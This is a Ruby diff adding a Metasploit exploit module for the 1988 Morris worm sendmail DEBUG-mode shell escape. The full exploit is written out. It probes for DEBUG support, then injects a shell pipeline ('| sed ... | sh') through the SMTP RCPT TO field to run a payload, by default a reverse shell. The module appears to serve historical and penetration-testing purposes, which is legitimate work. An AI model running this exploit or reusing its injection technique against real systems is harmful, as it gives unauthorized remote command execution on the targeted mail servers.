@@ -1,0 +1,144 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'expect'
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  # cmd/unix/reverse spams the session with Telnet codes on EOF
+  Rank = AverageRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Morris Worm sendmail Debug Mode Shell Escape',
+      'Description'    => %q{
+        This module exploits sendmail's well-known historical debug mode to
+        escape to a shell and execute commands in the SMTP RCPT TO command.
+
+        This vulnerability was exploited by the Morris worm in 1988-11-02.
+        Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg.
+
+        Currently only cmd/unix/reverse and cmd/unix/generic are supported.
+      },
+      'Author'         => [
+        'Robert Tappan Morris', # Exploit and worm for sure
+        'Cliff Stoll',          # The Cuckoo's Egg inspiration
+        'wvu'                   # Module and additional research
+      ],
+      'References'     => [
+        ['URL', 'https://en.wikipedia.org/wiki/Morris_worm'],         # History
+        ['URL', 'https://spaf.cerias.purdue.edu/tech-reps/823.pdf'],  # Analysis
+        ['URL', 'https://github.com/arialdomartini/morris-worm'],     # Source
+        ['URL', 'http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH'] # Setup
+      ],
+      'DisclosureDate' => 'Nov 2 1988',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => false, # DefUid in src/conf.c, usually "daemon"
+      'Payload'        => {'Compat' => {'RequiredCmd' => 'generic telnet'}},
+      'Targets'        => [
+        # https://en.wikipedia.org/wiki/Source_Code_Control_System
+        ['@(#)version.c       5.51 (Berkeley) 5/2/86', {}]
+      ],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'}
+    ))
+
+    register_options([Opt::RPORT(25)])
+
+    register_advanced_options([
+      OptFloat.new('SendExpectTimeout', [true, 'Timeout per send/expect', 3.5])
+    ])
+  end
+
+  def check
+    checkcode = CheckCode::Safe
+
+    connect
+    res = sock.get_once
+
+    return CheckCode::Unknown unless res
+
+    if res =~ /^220.*Sendmail/
+      checkcode = CheckCode::Detected
+    end
+
+    sock.put("DEBUG\r\n")
+    res = sock.get_once
+
+    return checkcode unless res
+
+    if res.start_with?('200 Debug set')
+      checkcode = CheckCode::Appears
+    end
+
+    checkcode
+  rescue Rex::ConnectionError => e
+    vprint_error(e.message)
+    CheckCode::Unknown
+  ensure
+    disconnect
+  end
+
+  def exploit
+    # We don't care who the user is, so randomize it
+    from = rand_text_alphanumeric(8..42)
+
+    # Strip mail header with sed(1), pass to sh(1), and ensure a clean exit
+    to = %("| sed '1,/^$/d' | sh; exit 0")
+
+    # We don't have $PATH, so set one
+    path = '/bin:/usr/bin:/usr/ucb:/etc'
+
+    sploit = {
+      nil                   => /220.*Sendmail/,
+      'DEBUG'               => /200 Debug set/,
+      "MAIL FROM:<#{from}>" => /250.*Sender ok/,
+      "RCPT TO:<#{to}>"     => /250.*Recipient ok/,
+      'DATA'                => /354 Enter mail/,
+      # Indent PATH= so it's not interpreted as part of the mail header
+      " PATH=#{path}"       => nil,
+      'export PATH'         => nil,
+      payload.encoded       => nil,
+      '.'                   => /250 Ok/,
+      'QUIT'                => /221.*closing connection/
+    }
+
+    print_status('Connecting to sendmail')
+    connect
+
+    print_status('Enabling debug mode and sending exploit')
+    sploit.each do |line, pattern|
+      Timeout.timeout(datastore['SendExpectTimeout']) do
+        if line
+          print_status("Sending: #{line}")
+          sock.put("#{line}\r\n")
+        end
+        if pattern
+          vprint_status("Expecting: #{pattern.inspect}")
+          sock.expect(pattern) do |pat|
+            return unless pat
+            vprint_good("Received: #{pat.first}")
+          end
+        end
+      end
+    end
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  rescue Timeout::Error
+    fail_with(Failure::TimeoutExpired, 'SendExpectTimeout maxed out')
+  ensure
+    disconnect
+  end
+
+  def on_new_session(session)
+    print_warning("Do NOT type `exit', or else you may lose further shells!")
+    print_warning('Hit ^C to abort the session instead, please and thank you')
+  end
+
+end
